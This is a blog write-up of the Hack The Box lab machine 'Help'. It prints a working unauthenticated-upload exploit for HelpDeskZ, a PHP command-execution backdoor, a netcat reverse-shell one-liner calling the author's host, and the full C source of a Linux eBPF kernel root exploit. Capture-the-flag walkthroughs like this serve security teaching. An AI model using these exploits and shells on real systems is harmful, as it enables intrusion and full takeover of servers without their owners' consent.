<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Help | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Help" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up for Help from Hack The Box." />
<meta property="og:description" content="My write-up for Help from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/help/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/help/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/help/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-06-08T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up for Help from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/help/","image":"https://0xrick.github.io/hackthebox/help/0.png","headline":"Hack The Box - Help","dateModified":"2019-06-08T00:00:00+02:00","datePublished":"2019-06-08T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/help/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.png" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Help</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
      <a class="tag" href="/tag/python/">python</a>
      
      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
      
  </div>
  
  <div class="post-date">Published on 08 Jun 2019</div>
  
  <div class="post-description">My write-up for Help from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br> Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called <code class="highlighter-rouge">HelpDeskZ</code>. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.121</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">help.htb</code>. Let’s jump right in !
<img src="/images/hackthebox/help/0.png" alt=""></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="highlighter-rouge">nmap -sV -sT -sC help.htb</code>
<img src="/images/hackthebox/help/1.png" alt="">
<br> We got <code class="highlighter-rouge">ssh</code> on port 22 and <code class="highlighter-rouge">http</code> on two ports : 80 and 3000. What’s running on port 80 is an <code class="highlighter-rouge">Apache2</code> server and on port 3000 is <code class="highlighter-rouge">Node.js Express Framework</code>.
<br></p>
<hr>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br> On port 80 there’s just the default <code class="highlighter-rouge">Apache</code> index page :
<img src="/images/hackthebox/help/2.png" alt="">
<br> So I ran <code class="highlighter-rouge">gobuster</code> and got these results :
<code class="highlighter-rouge">gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://help.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/07 13:03:25 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
=====================================================
2019/06/07 13:05:25 Finished
=====================================================
</code></pre></div></div>
<p><br> I went to <code class="highlighter-rouge">/support</code> and there was a web application called <code class="highlighter-rouge">HelpDeskZ</code> :
<img src="/images/hackthebox/help/3.png" alt=""></p>
<hr>

<h2 id="file-upload-vulnerability">File Upload Vulnerability</h2>
<p><br> A quick search and I found an <a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener noreferrer">unauthenticated file upload vulnerability</a> that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload <code class="highlighter-rouge">php</code> files because they are allowed by default.</p>

<blockquote>
  <p>HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.
The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -<a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener noreferrer">exploit-db</a></p>
</blockquote>

<p><br> I wanted to test if I can really upload <code class="highlighter-rouge">php</code> so I went to <code class="highlighter-rouge">Submit a Ticket</code> and I attached a test file :
<img src="/images/hackthebox/help/4.png" alt="">
<br>
<br>
<img src="/images/hackthebox/help/5.png" alt="">
<br>
<br>
<img src="/images/hackthebox/help/6.png" alt="">
<br> And I got <code class="highlighter-rouge">File is not allowed.</code>
<br> Luckily <code class="highlighter-rouge">HelpDeskZ</code> is an open-source application so I checked the source on <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github</a>. 
<br> The script that handles tickets submissions is called <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">new-ticket.php</code></a>. It can be found in <code class="highlighter-rouge">includes/parser</code>. 
<br> Here’s the part for the attachments :
<img src="/images/hackthebox/help/7.png" alt=""></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(is_array($attachments)){
		$save_dir = UPLOAD_DIR;
		foreach($attachments as $attachment) {
		  // get the attachment name
		  $filename = $attachment-&gt;filename;
		  // write the file to the directory you want to save it in
		  if ($fp = fopen($save_dir.$filename, 'w')) {
			while($bytes = $attachment-&gt;read()) {
			  fwrite($fp, $bytes);
			}
			fclose($fp);
		  }
			
		  $filesize = @filesize(UPLOAD_DIR.$filename);
		  if($filesize){
			  $fileinfo = array('name' =&gt; $filename, 'size' =&gt; $filesize);
			  $fileverification = verifyAttachment($fileinfo);
			  if($fileverification['msg_code'] == 0){
				$ext = pathinfo($filename, PATHINFO_EXTENSION);
				$filename_encoded = md5($filename.time()).".".$ext;
				$data = array('name' =&gt; $filename, 'enc' =&gt; $filename_encoded, 'filesize' =&gt; $filesize, 'ticket_id' =&gt; $ticketid, 'msg_id' =&gt; $message_id, 'filetype' =&gt; $attachment-&gt;content_type);
				$db-&gt;insert(TABLE_PREFIX."attachments", $data);
				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
			  }else{
				unlink(UPLOAD_DIR.$filename);
			  }
		  }
		}
</code></pre></div></div>
<p><br> It takes the file and uploads it then there’s an <code class="highlighter-rouge">if</code> statement that checks the result of passing <code class="highlighter-rouge">$fileinfo</code> to a function called <code class="highlighter-rouge">verifyAttachment</code>. If the function returned <code class="highlighter-rouge">0</code> it will rename the file. If it’s not <code class="highlighter-rouge">0</code> it will delete the file (<code class="highlighter-rouge">unlink(UPLOAD_DIR.$filename)</code>) . This function can be found in <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">functions.php</code></a> in <code class="highlighter-rouge">includes/</code>. 
<code class="highlighter-rouge">verifyAttachment()</code> :
<img src="/images/hackthebox/help/8.png" alt=""></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function verifyAttachment($filename){
	global $db;	
	$namepart = explode('.', $filename['name']);
	$totalparts = count($namepart)-1;
	$file_extension = $namepart[$totalparts];
	if(!ctype_alnum($file_extension)){
		$msg_code = 1;
	}else{
		$filetype = $db-&gt;fetchRow("SELECT count(id) AS total, size FROM ".TABLE_PREFIX."file_types WHERE type='".$db-&gt;real_escape_string($file_extension)."'");
		if($filetype['total'] == 0){
			$msg_code = 2;
		}elseif($filename['size'] &gt; $filetype['size'] &amp;&amp; $filetype['size'] &gt; 0){
			$msg_code = 3;
			$misc = formatBytes($filetype['size']);
		}else{	
			$msg_code = 0;
		}
	}
	$data = array('msg_code' =&gt; $msg_code, 'msg_extra' =&gt; $misc);
	return $data;
}
</code></pre></div></div>
<p><br> This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return <code class="highlighter-rouge">0</code> and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : <code class="highlighter-rouge">File is not allowed.</code> is meaningless. 
<br> If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time. 
<br> If we take a look at the exploit :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) &lt; 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
</code></pre></div></div>
<p><br> We can solve this problem by iterating over a higher range than 300 : <code class="highlighter-rouge">for x in range(0, 300)</code>
<br> This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours. 
<br></p>
<hr>

<h2 id="nodejs-getting-credentials">Node.js, Getting Credentials</h2>
<p><br> We saw earlier that port 3000 was open and running <code class="highlighter-rouge">Node.js Express framework</code> and we haven’t looked at that yet. 
<img src="/images/hackthebox/help/9.png" alt="">
<br> By going to <code class="highlighter-rouge">http://help.htb:3000/</code> I got this response of a message saying : <code class="highlighter-rouge">"Hi Shiv, To get access please find the credentials with given query"</code>, I tried <code class="highlighter-rouge">/test</code> and got this :
<img src="/images/hackthebox/help/10.png" alt="">
<br> tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about <code class="highlighter-rouge">node.js</code>, <code class="highlighter-rouge">node.js</code> queries and other related stuff. After a lot of attempts to find something when I tried <code class="highlighter-rouge">/graphql</code> I got this response :
<img src="/images/hackthebox/help/11.png" alt="">
<br> So I added <code class="highlighter-rouge">?query</code> : <code class="highlighter-rouge">http://help.htb:3000/graphql?query</code> and got a syntax error :
<img src="/images/hackthebox/help/12.png" alt="">
<br> That’s fine, I tried requesting a query, for example <code class="highlighter-rouge">user</code> : <code class="highlighter-rouge">http://help.htb:3000/graphql?query={user}</code> :
<img src="/images/hackthebox/help/13.png" alt="">
<br> It says that <code class="highlighter-rouge">user</code> must have a selection of subfields so I tried <code class="highlighter-rouge">username</code> : <code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{username}}</code> :
<img src="/images/hackthebox/help/14.png" alt="">
<br> Great, let’s get the password : <code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{password}}</code> :
<img src="/images/hackthebox/help/15.png" alt="">
<br> I used <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> to crack the hash and got this password : 
<code class="highlighter-rouge">5d3c93182bb20f07b994a7f617e99cff</code> : <code class="highlighter-rouge">godhelpmeplz</code>
<br> Now we have the credentials : <code class="highlighter-rouge">helpme@helpme.com : godhelpmeplz</code>
<br></p>
<hr>

<h2 id="file-upload-exploitation-reverse-shell-and-user-flag">File Upload Exploitation, Reverse Shell and User Flag</h2>
<p><br> I edited the path of the uploads in the exploit, instead of <code class="highlighter-rouge">helpdeskzBaseUrl+md5hash+'.php'</code> I made it <code class="highlighter-rouge">helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'</code> (I got this path from the <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github repository</a>). Exploit after edits :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) &lt; 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
</code></pre></div></div>
<p><br> I went to the settings and changed the timezone to the same timezone as mine :
<img src="/images/hackthebox/help/16.png" alt="">
<br> The <code class="highlighter-rouge">php</code> file I’m going to upload is <code class="highlighter-rouge">simple-backdoor.php</code> which can be found in <code class="highlighter-rouge">/usr/share/webshells/php/simple-backdoor.php</code> in <code class="highlighter-rouge">kali</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;

&lt;?php

if(isset($_REQUEST['cmd'])){
        echo "&lt;pre&gt;";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "&lt;/pre&gt;";
        die;
}

?&gt;

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

&lt;!--    http://michaeldaw.org   2006    --&gt;
</code></pre></div></div>
<p><br> I submitted the ticket :
<img src="/images/hackthebox/help/17.png" alt="">
<br> Then I ran the exploit and it found the file immediately :
<code class="highlighter-rouge">python exploit.py http://10.10.10.121/support/ rick.php</code>
<img src="/images/hackthebox/help/18.png" alt="">
<br>
<br>
<code class="highlighter-rouge">http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php</code>
<img src="/images/hackthebox/help/19.png" alt="">
<br>
<code class="highlighter-rouge">http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami</code>
<img src="/images/hackthebox/help/20.png" alt="">
<br> It’s working, let’s get a reverse shell, I used this payload : <code class="highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f</code> (url encoded)
<code class="highlighter-rouge">http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff</code>
<img src="/images/hackthebox/help/21.png" alt="">
<br>
<br>
<img src="/images/hackthebox/help/22.png" alt="">
<br> We owned user.
<br></p>
<hr>

<h2 id="kernel-exploit-privilege-escalation-and-root-flag">Kernel Exploit, Privilege Escalation and Root Flag</h2>
<p><br> Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :
<code class="highlighter-rouge">uname -a</code>
<img src="/images/hackthebox/help/23.png" alt="">
<br> That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an <a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener noreferrer">exploit</a> published for it.
<code class="highlighter-rouge">exploit.c</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;linux/bpf.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/un.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;stdint.h&gt;

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog = 	"\xb4\x09\x00\x00\xff\xff\xff\xff"
		"\x55\x09\x02\x00\xff\xff\xff\xff"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x18\x19\x00\x00\x03\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x00\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x06\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x01\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x07\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x02\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x08\x00\x00\x00\x00\x00\x00"
		"\xbf\x02\x00\x00\x00\x00\x00\x00"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x03\x00\x00\x00\x00\x00"
		"\x79\x73\x00\x00\x00\x00\x00\x00"
		"\x7b\x32\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x02\x00\x01\x00\x00\x00"
		"\x7b\xa2\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x7b\x87\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00";

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version) {
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (__u64)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (__u64)license,
		.log_buf = (__u64)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries) {
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&amp;key,
		.value = (__u64)&amp;value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));
}

static void __exit(char *err) {
	fprintf(stderr, "error: %s\n", err);
	exit(-1);
}

static void prep(void) {
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
	if (mapfd &lt; 0)
		__exit(strerror(errno));

	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
			(struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);

	if (progfd &lt; 0)
		__exit(strerror(errno));

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
		__exit(strerror(errno));

	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)
		__exit(strerror(errno));
}

static void writemsg(void) {
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n &lt; 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();

static uint64_t get_value(int key) {
	uint64_t value;

	if (bpf_lookup_elem(&amp;key, &amp;value))
		__exit(strerror(errno));

	return value;
}

static uint64_t __get_fp(void) {
	__update_elem(1, 0, 0);

	return get_value(2);
}

static uint64_t __read(uint64_t addr) {
	__update_elem(0, addr, 0);

	return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) {
	__update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {
	return addr &amp; ~(0x4000 - 1);
}

static void pwn(void) {
	uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp &lt; PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp &lt; PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct &lt; PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);

	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr &lt; PHYS_OFFSET)
		__exit("bogus cred ptr");

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr &lt; PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf("spawning root shell\n");
		system("/bin/bash");
		exit(0);
	}

	__exit("not vulnerable?");
}

int main(int argc, char **argv) {
	prep();
	pwn();

	return 0;
}
</code></pre></div></div>
<p><br> I ran a python server to host the exploit then I downloaded it on the box :
<img src="/images/hackthebox/help/24.png" alt="">
<br> Then I compiled the exploit and ran it :
<code class="highlighter-rouge">gcc -o exploit exploit.c</code>
<img src="/images/hackthebox/help/25.png" alt="">
<br> And we owned root !
<br> That’s it , Feedback is appreciated !
<br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : <a href="/hack-the-box/sizzle/">Hack The Box - Sizzle</a>
<br> Next Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - FluJab</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/swagshop/">
            Hack The Box - Swagshop
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/kryptos/">
            Hack The Box - Kryptos
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/luke/">
            Hack The Box - Luke
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
